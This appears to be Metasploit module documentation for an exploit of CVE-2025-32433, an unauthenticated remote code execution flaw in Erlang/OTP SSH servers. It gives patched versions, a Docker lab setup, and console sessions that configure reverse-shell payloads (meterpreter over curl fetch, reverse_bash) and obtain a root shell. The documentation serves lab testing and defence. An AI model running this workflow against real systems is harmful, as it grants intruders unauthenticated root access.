## Vulnerable Application

Erlang/OTP is a set of libraries for the Erlang programming language.

Prior to versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20, a SSH server may allow an attacker
to perform unauthenticated remote code execution (RCE).

By exploiting a flaw in SSH protocol message handling, a malicious actor could gain unauthorized access
to affected systems and execute arbitrary commands without valid credentials. This issue is patched in
versions OTP-27.3.3, OTP-26.2.5.11, and OTP-25.3.2.20.

A temporary workaround involves disabling the SSH server or to prevent access via firewall rules.

### Introduction

This module exploits CVE-2025-32433, a pre-authentication vulnerability in Erlang-based SSH servers
that allows remote command execution. By sending crafted SSH packets, it executes a Metasploit
payload to establish a reverse shell on the target system.

The exploit leverages a flaw in the SSH protocol handling to execute commands via the Erlang `os:cmd`
function without requiring authentication.

## Testing

Execute the following commands:

```bash
git clone https://github.com/ProDefense/CVE-2025-32433
cd CVE-2025-32433
docker build -t cve-ssh:latest .
docker run -d -p 2222:2222 cve-ssh:latest
```

## Verification Steps

1. Start msfconsole
2. Do: `use exploit/linux/ssh/ssh_erlangotp_rce`
3. Do: `set RHOSTS [IP]`
5. Do: `run`

## Scenarios

### Target 0

Use the linux commands CMD.

```
msf6 exploit(linux/ssh/ssh_erlangotp_rce) > options 

Module options (exploit/linux/ssh/ssh_erlangotp_rce):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.1.16     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   2222             yes       The target port

Payload options (cmd/linux/https/x64/meterpreter/reverse_tcp):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   FETCH_CHECK_CERT  false            yes       Check SSL certificate
   FETCH_COMMAND     CURL             yes       Command to fetch payload (Accepted: CURL, FTP, TFTP, TNFTP, WGET)
   FETCH_DELETE      false            yes       Attempt to delete the binary after execution
   FETCH_FILELESS    false            yes       Attempt to run payload without touching disk, Linux ≥3.17 only
   FETCH_SRVHOST                      no        Local IP to use for serving payload
   FETCH_SRVPORT     8080             yes       Local port to use for serving payload
   FETCH_URIPATH                      no        Local URI to use for serving payload
   LHOST             192.168.1.16     yes       The listen address (an interface may be specified)
   LPORT             4444             yes       The listen port

   When FETCH_FILELESS is false:

   Name                Current Setting  Required  Description
   ----                ---------------  --------  -----------
   FETCH_FILENAME      PBAcwEBEszFT     no        Name to use on remote system when storing payload; cannot contain spaces or slashes
   FETCH_WRITABLE_DIR  /tmp             yes       Remote writable dir to store payload; cannot contain spaces

Exploit target:

   Id  Name
   --  ----
   0   Linux Command


View the full module info with the info, or info -d command.

msf6 exploit(linux/ssh/ssh_erlangotp_rce) > run
[*] Started reverse TCP handler on 192.168.1.16:4444 
[*] Starting exploit for CVE-2025-32433
[*] Connecting to SSH server...
[*] Sending SSH banner...
[+] Received banner: SSH-2.0-Erlang/5.1.4.7
[*] Sending SSH_MSG_KEXINIT...
[*] Sending SSH_MSG_CHANNEL_OPEN...
[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
[+] Payload sent successfully
[*] Sending stage (3045380 bytes) to 172.17.0.2
[*] Meterpreter session 6 opened (192.168.1.16:4444 -> 172.17.0.2:41536) at 2025-04-18 23:38:52 +0400

meterpreter > 
```

### Target 1

Use the unix commands CMD.

```
msf6 exploit(linux/ssh/ssh_erlangotp_rce) > options 

Module options (exploit/linux/ssh/ssh_erlangotp_rce):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS  192.168.1.16     yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   2222             yes       The target port

Payload options (cmd/unix/reverse_bash):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.1.16     yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port

Exploit target:

   Id  Name
   --  ----
   1   Unix Command


View the full module info with the info, or info -d command.

msf6 exploit(linux/ssh/ssh_erlangotp_rce) > run
[*] Started reverse TCP handler on 192.168.1.16:4444 
[*] Starting exploit for CVE-2025-32433
[*] Connecting to SSH server...
[*] Sending SSH banner...
[+] Received banner: SSH-2.0-Erlang/5.1.4.7
[*] Sending SSH_MSG_KEXINIT...
[*] Sending SSH_MSG_CHANNEL_OPEN...
[*] Sending SSH_MSG_CHANNEL_REQUEST (pre-auth)...
[+] Payload sent successfully
[*] Command shell session 7 opened (192.168.1.16:4444 -> 172.17.0.2:50092) at 2025-04-18 23:53:55 +0400

whoami
root
```

## References

1. <https://x.com/Horizon3Attack/status/1912945580902334793>
2. <https://platformsecurity.com/blog/CVE-2025-32433-poc>
3. <https://github.com/ProDefense/CVE-2025-32433>
